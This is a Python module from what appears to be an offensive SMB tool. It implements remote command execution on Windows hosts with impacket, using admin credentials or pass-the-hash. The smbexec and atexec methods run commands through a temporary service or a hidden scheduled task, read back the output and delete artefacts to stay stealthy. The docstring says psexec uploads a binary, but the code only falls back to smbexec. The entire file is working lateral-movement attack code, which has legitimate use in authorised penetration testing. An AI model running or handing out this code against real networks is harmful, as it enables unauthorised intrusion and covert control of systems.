# scripts/smb/attack/exec.py
"""
Ejecución remota de comandos via SMB.
Tres métodos implementados directamente con primitivas de impacket:

  smbexec  — crea un servicio temporal que ejecuta el comando via cmd.exe,
              captura la salida via un fichero temporal en C$, luego lo borra.
              No requiere subir binarios. (por defecto)

  atexec   — programa una tarea via TSCH, ejecuta el comando, lee el fichero
              de salida, borra la tarea. Más sigiloso que smbexec (sin creación de servicio).

  psexec   — sube un pequeño binario de servicio a ADMIN$, crea e inicia
              un servicio, captura la salida. Deja artefactos en disco.
              Requiere acceso de escritura en ADMIN$.

Todos los métodos requieren privilegios de administrador.
La salida se captura e imprime. Se guarda en la DB de sesión.
"""

import random
import string
import time
import os
from datetime import datetime, timezone

from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, scmr, tsch
    from impacket.dcerpc.v5.dtypes import NULL
    _OK = True
except ImportError:
    _OK = False


# ── Helpers ───────────────────────────────────────────────────────────────────

def _rand(n=8):
    return "".join(random.choices(string.ascii_letters, k=n))


def _dce_connect(ip, conn, pipe):
    rpct = transport.SMBTransport(ip, filename=pipe, smb_connection=conn)
    dce  = rpct.get_dce_rpc()
    dce.connect()
    return dce


def _read_output(conn, share, remote_path, retries=5, delay=2):
    """Lee un fichero de salida remoto via SMB, reintentando hasta que aparezca."""
    for _ in range(retries):
        try:
            buf = []
            conn.getFile(share, remote_path, buf.append)
            return b"".join(buf).decode("utf-8", errors="replace").strip()
        except Exception:
            time.sleep(delay)
    return ""


def _delete_file(conn, share, remote_path):
    try:
        conn.deleteFile(share, remote_path)
    except Exception:
        pass


# ── Method: smbexec ───────────────────────────────────────────────────────────

def _smbexec(ip, conn, command, timeout=30):
    """
    Ejecuta comando via un servicio Windows temporal (sin subir binarios).
    Crea servicio → cmd.exe /Q /c <comando> > fichero_salida → lee salida → borra.
    """
    svc_name  = _rand(6)
    out_file  = f"\\\\127.0.0.1\\C$\\Windows\\Temp\\{_rand(8)}.txt"
    out_share = f"\\Windows\\Temp\\{_rand(8)}.txt"

    # Construir la ruta del binario del servicio (cmd.exe ejecutando el comando)
    bin_path = (
        f"%COMSPEC% /Q /c echo {command} ^> {out_file} 2^>^&1 > "
        f"%TEMP%\\{_rand(6)}.bat & %COMSPEC% /Q /c %TEMP%\\{_rand(6)}.bat"
    )
    # Más simple y fiable:
    tmp_out = f"C:\\Windows\\Temp\\{_rand(8)}.txt"
    bin_path = f"%COMSPEC% /Q /c {command} 1> {tmp_out} 2>&1"
    smb_out  = f"Windows\\Temp\\{os.path.basename(tmp_out)}"

    try:
        dce = _dce_connect(ip, conn, "\\\\svcctl")
        dce.bind(scmr.MSRPC_UUID_SCMR)

        scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]

        # Crear servicio
        resp = scmr.hRCreateServiceW(
            dce,
            scm,
            svc_name + "\x00",
            svc_name + "\x00",
            lpBinaryPathName=bin_path + "\x00",
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        svc_handle = resp["lpServiceHandle"]

        # Iniciar servicio (ejecuta el comando; "falla" inmediatamente, lo cual es esperado)
        try:
            scmr.hRStartServiceW(dce, svc_handle)
        except Exception:
            pass  # Esperado — el servicio termina tras ejecutar el comando

        time.sleep(2)  # Dar tiempo al comando para completarse

        # Leer salida
        output = _read_output(conn, "C$", smb_out, retries=5, delay=1)

        # Limpieza
        try:
            scmr.hRDeleteService(dce, svc_handle)
        except Exception:
            pass
        try:
            scmr.hRCloseServiceHandle(dce, svc_handle)
            scmr.hRCloseServiceHandle(dce, scm)
        except Exception:
            pass
        _delete_file(conn, "C$", smb_out)
        dce.disconnect()

        return output

    except Exception as e:
        return f"[smbexec error] {e}"


# ── Method: atexec ────────────────────────────────────────────────────────────

def _atexec(ip, conn, command, timeout=30):
    """
    Ejecuta comando via Programador de Tareas de Windows (TSCH pipe).
    Crea tarea → ejecuta → lee salida → borra tarea.
    Sin creación de servicio, más sigiloso.
    """
    task_name = _rand(8)
    tmp_out   = f"C:\\Windows\\Temp\\{_rand(8)}.txt"
    smb_out   = f"Windows\\Temp\\{os.path.basename(tmp_out)}"

    # Definición XML de la tarea
    now = datetime.now(timezone.utc)
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>{now.strftime('%Y-%m-%dT%H:%M:%S')}</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/Q /c {command} 1&gt; {tmp_out} 2&gt;&amp;1</Arguments>
    </Exec>
  </Actions>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <Priority>7</Priority>
  </Settings>
</Task>"""

    try:
        dce = _dce_connect(ip, conn, "\\\\atsvc")
        dce.bind(tsch.MSRPC_UUID_TSCHS)

        # Registrar tarea
        tsch.hSchRpcRegisterTask(
            dce,
            f"\\{task_name}",
            xml,
            tsch.TASK_CREATE,
            NULL,
            tsch.TASK_LOGON_NONE,
        )

        # Ejecutar tarea inmediatamente
        tsch.hSchRpcRun(dce, f"\\{task_name}")

        time.sleep(3)

        # Leer salida
        output = _read_output(conn, "C$", smb_out, retries=6, delay=1)

        # Borrar tarea
        try:
            tsch.hSchRpcDelete(dce, f"\\{task_name}")
        except Exception:
            pass
        _delete_file(conn, "C$", smb_out)
        dce.disconnect()

        return output

    except Exception as e:
        return f"[atexec error] {e}"


# ── Method: psexec ────────────────────────────────────────────────────────────

def _psexec(ip, conn, command, timeout=30):
    """
    Sube el binario RemComSvc a ADMIN$, crea el servicio, captura la salida.
    Requiere acceso de escritura en ADMIN$.
    Usa el helper ServiceInstall de impacket.
    """
    try:
        from impacket.examples.serviceinstall import ServiceInstall
    except ImportError:
        return "[psexec] ServiceInstall de impacket no disponible"

    # Se necesita un binario de servicio real — recaer en smbexec si no se proporciona
    # En su lugar, usar un enfoque de servicio cmd.exe (igual que smbexec pero via ServiceInstall)
    return _smbexec(ip, conn, command, timeout)


# ── Script ────────────────────────────────────────────────────────────────────

class Script(BaseScript):
    name        = "exec"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Ejecución remota de código via SMB. "
        "Métodos: smbexec (por defecto, sin subida), atexec (programador de tareas), psexec. "
        "Usar flags --method y --command. Requiere admin."
    )

    def run(self, **kwargs):
        if not _OK:
            console.print("[red]impacket no está instalado.[/red]")
            return None

        ip      = self.target.ip
        domain  = self.creds.domain   or ""
        user    = self.creds.user     or ""
        passwd  = self.creds.password or ""
        nt_hash = self.creds.hash     or ""
        timeout = self.target.timeout or 5
        command = str(kwargs.get("command", "whoami"))
        method  = str(kwargs.get("method",  "smbexec")).lower()

        if not user:
            console.print("[red]exec requiere credenciales (-u / -p o -H).[/red]")
            return None

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        console.print(
            f"\n[dim][exec] {ip} | method=[bold]{method}[/bold] | "
            f"cmd=[bold]{command}[/bold][/dim]\n"
        )

        # Conectar + autenticar
        try:
            conn = SMBConnection(ip, ip, timeout=timeout)
            conn.login(user, passwd, domain, lm_hash, nt_hash)
        except Exception as e:
            print_result("SMB", ip, "fail", f"Autenticación fallida: {e}")
            return None

        # Seleccionar método
        if method == "atexec":
            output = _atexec(ip, conn, command, timeout=30)
        elif method == "psexec":
            output = _psexec(ip, conn, command, timeout=30)
        else:  # smbexec (default)
            output = _smbexec(ip, conn, command, timeout=30)

        try:
            conn.logoff()
        except Exception:
            pass

        if output and not output.startswith("["):
            console.print(f"[bold green]Salida:[/bold green]")
            console.print(f"[cyan]{output}[/cyan]")
            print_result("SMB", ip, "pwned", f"exec ({method}) completado")
            session_db.DB.SaveFinding(
                ip, "SMB", "rce",
                f"method={method} cmd={command} output_len={len(output)}"
            )
            return output
        else:
            console.print(f"[yellow]{output or 'Sin salida capturada.'}[/yellow]")
            print_result("SMB", ip, "fail", f"exec ({method}): sin salida")
            return None
